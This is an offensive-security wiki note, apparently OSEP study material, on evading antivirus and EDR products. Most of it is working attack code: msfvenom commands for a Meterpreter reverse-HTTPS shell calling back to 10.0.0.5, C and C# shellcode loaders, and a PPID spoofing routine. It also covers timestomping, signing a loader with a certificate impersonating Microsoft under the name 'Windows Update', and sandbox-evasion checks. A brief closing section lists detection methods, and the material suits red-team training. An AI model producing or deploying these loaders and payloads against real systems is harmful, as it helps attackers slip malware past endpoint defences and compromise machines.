---
title: AV/EDR evasion primer
slug: av-evasion-primer
aliases: [av-evasion, edr-evasion-basics, payload-evasion]
---

> **TL;DR:** AV/EDR detection has three layers — static signatures, heuristic analysis, and behavioural monitoring. Evasion means defeating all three: custom loaders beat signatures, process-level tricks (PPID spoofing, argument spoofing) defeat heuristics, and careful API call patterns defeat behavioural engines. No single technique works alone.

## What it is
Modern endpoint protection combines multiple engines: signature matching on file bytes, heuristic/emulation of PE execution, and runtime behavioural analysis via kernel callbacks and ETW. Evasion is the practice of crafting payloads and execution chains that pass all three layers. This note covers the foundations — encoding, custom loaders, staged vs stageless trade-offs, process attribute spoofing, timestomping, and code signing.

## Preconditions / where it applies
- Target has AV (Defender, CrowdStrike, SentinelOne, etc.) — nearly every enterprise endpoint
- You need to deliver and execute a payload (shellcode, DLL, EXE) without detection
- Understanding of PE format, Windows process creation, and basic C/C#/Go/Rust compilation
- These techniques apply at OSEP Module 2-3 level and form the base for advanced [[edr-hooks-and-unhooking]]

## Technique

### Detection layers explained

| Layer | What it checks | When | Evasion approach |
|---|---|---|---|
| **Static/signature** | File bytes, strings, known hashes, YARA rules | On write / on scan | Encoding, encryption, custom compile |
| **Heuristic/emulation** | PE structure, import table, entropy, sandbox execution | On open / at load | Remove IoCs, custom loader, anti-emulation |
| **Behavioural** | API call sequences, process relationships, memory operations | At runtime | Indirect syscalls, PPID spoofing, sleep delays |

### Payload encoding — msfvenom

Encoding is not evasion — it's a starting point. It defeats only static byte-matching:

```bash
# XOR encoding (Shikata Ga Nai — polymorphic XOR feedback encoder)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 \
  -e x64/xor_dynamic -i 5 -f raw -o payload.bin

# Shikata Ga Nai (x86 only, polymorphic)
msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 \
  -e x86/shikata_ga_nai -i 10 -f raw -o payload.bin
```

Every AV vendor signatures Shikata output. Use it only as a first transform, never as the sole evasion.

### Custom loaders — the core technique

The loader allocates memory, decrypts shellcode, and executes it. Writing your own defeats signatures because the binary is unique:

**C loader (minimal):**

```c
#include <windows.h>
// XOR-encrypted shellcode (key: 0x41)
unsigned char sc[] = { 0x89, 0xa2, ... };
int main() {
    for (int i = 0; i < sizeof(sc); i++) sc[i] ^= 0x41;
    void* mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, sc, sizeof(sc));
    DWORD old;
    VirtualProtect(mem, sizeof(sc), PAGE_EXECUTE_READ, &old); // RW -> RX, never RWX
    ((void(*)())mem)();
}
```

**C# loader with AES decryption:**

```csharp
static void Main() {
    byte[] encrypted = Convert.FromBase64String("...");
    byte[] key = Encoding.UTF8.GetBytes("0123456789ABCDEF");
    byte[] sc = AesDecrypt(encrypted, key);

    IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04); // RW
    Marshal.Copy(sc, 0, mem, sc.Length);
    VirtualProtect(mem, (UIntPtr)sc.Length, 0x20, out uint old);  // RX
    IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(thread, 0xFFFFFFFF);
}
```

**Language choice matters:**
- **C/C++** — smallest binary, full control, no runtime dependency
- **C#** — easy Win32 via P/Invoke, but CLR loading is a signal; use D/Invoke (see [[offensive-dotnet-tradecraft]])
- **Nim** — compiles to native, small binary, cross-compiles from Linux; Winim for Win32 API
- **Go** — large binary (helps bury shellcode in entropy), but statically linked = no IAT to hook
- **Rust** — native, small, excellent `windows-sys` crate; growing adoption in implant development

### Staged vs stageless payloads

| | Staged | Stageless |
|---|---|---|
| **Size** | Small stager (~4KB) | Full payload (200KB+) |
| **Network** | Stager fetches full payload over C2 | Self-contained |
| **Detection** | Stager download is a known pattern; stage transfer is signatured | Larger file = more bytes to scan |
| **Recommendation** | Initial access where size matters | Post-exploitation, OPSEC-sensitive |

For OSEP: stageless is generally preferred — the staging round-trip is an extra detection opportunity.

### PPID spoofing for behavioural evasion

EDRs flag suspicious parent-child relationships (e.g., `word.exe` → `cmd.exe`). PPID spoofing creates the process under a benign parent:

```c
STARTUPINFOEXA si = { sizeof(si) };
SIZE_T size;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
    (LPSTARTUPINFOA)&si, &pi);
// Inject shellcode into pi.hProcess, then resume
```

### Timestomping

Match your dropped file's timestamps to a legitimate system file:

```powershell
# PowerShell — copy timestamps from a system binary
$legit = Get-Item C:\Windows\System32\notepad.exe
$payload = Get-Item C:\Users\Public\svchost.exe
$payload.CreationTime = $legit.CreationTime
$payload.LastWriteTime = $legit.LastWriteTime
$payload.LastAccessTime = $legit.LastAccessTime
```

```c
// C — SetFileTime to match another file
FILETIME ct, wt, at;
HANDLE hRef = CreateFile(L"C:\\Windows\\notepad.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
GetFileTime(hRef, &ct, &at, &wt);
HANDLE hTarget = CreateFile(L"C:\\Users\\Public\\svc.exe", FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
SetFileTime(hTarget, &ct, &at, &wt);
```

### Code signing with self-signed certificates

A signed binary gets fewer heuristic scans. Self-signed won't pass SmartScreen but helps with AV heuristic score:

```bash
# Generate self-signed code-signing cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=Microsoft Windows/O=Microsoft Corporation"
openssl pkcs12 -export -in cert.pem -inkey key.pem -out cert.pfx -passout pass:
# Sign with osslsigncode
osslsigncode sign -pkcs12 cert.pfx -n "Windows Update" -t http://timestamp.digicert.com \
  -in loader.exe -out loader_signed.exe
```

Better: use a valid EV certificate (expired ones from compromised signing infra are traded in underground markets — this is what real APTs do; for testing, self-signed suffices).

### Anti-emulation / sandbox evasion

```c
// Simple: check for user interaction (sandboxes auto-execute)
POINT p1, p2;
GetCursorPos(&p1); Sleep(3000); GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) return 0; // no mouse movement = sandbox

// Check memory: most sandboxes have < 4GB
MEMORYSTATUSEX ms = { sizeof(ms) };
GlobalMemoryStatusEx(&ms);
if (ms.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return 0;
```

## Detection and defence
- **Memory allocation patterns:** `VirtualAlloc` → write → `VirtualProtect` to RX → execute is the canonical shellcode-loader pattern; EDRs hook all three calls
- **Unsigned binaries** in user-writable paths executing shortly after creation — correlate Sysmon Event ID 1 + 11
- **PPID spoofing** is detected by kernel-level process creation callbacks that see the real parent (ETW vs reported PPID mismatch)
- **Timestomping** leaves MFT `$SI` vs `$FN` timestamp discrepancy — forensic tools like MFTECmd detect this trivially
- **Code signing** with known-revoked or self-signed certs: check certificate chain validity, not just presence
- **Application whitelisting** (WDAC, AppLocker) is the strongest control — custom loaders don't run if they're not on the allow list
- Enable **ASR rules** in Defender: block process creation from Office apps, block unsigned/untrusted executables

## References
- [OffSec PEN-300 (OSEP) — Evasion Techniques and Breaching Defenses](https://www.offsec.com/courses/pen-300/)
- [ired.team — AV bypass with Metasploit templates](https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates)
- [S3cur3Th1sSh1t — Nim shellcode loader](https://s3cur3th1ssh1t.github.io/) — practical Nim-based loader examples
- [elastic/protections-artifacts](https://github.com/elastic/protections-artifacts) — detection rules to test against

See also: [[amsi-bypass]], [[edr-hooks-and-unhooking]], [[syscall-direct-and-indirect]], [[offensive-dotnet-tradecraft]], [[dll-side-loading]], [[donut-shellcode-generation]], [[osep-payload-development-toolkit]], [[sleep-mask-and-memory-evasion]], [[process-injection-techniques]]
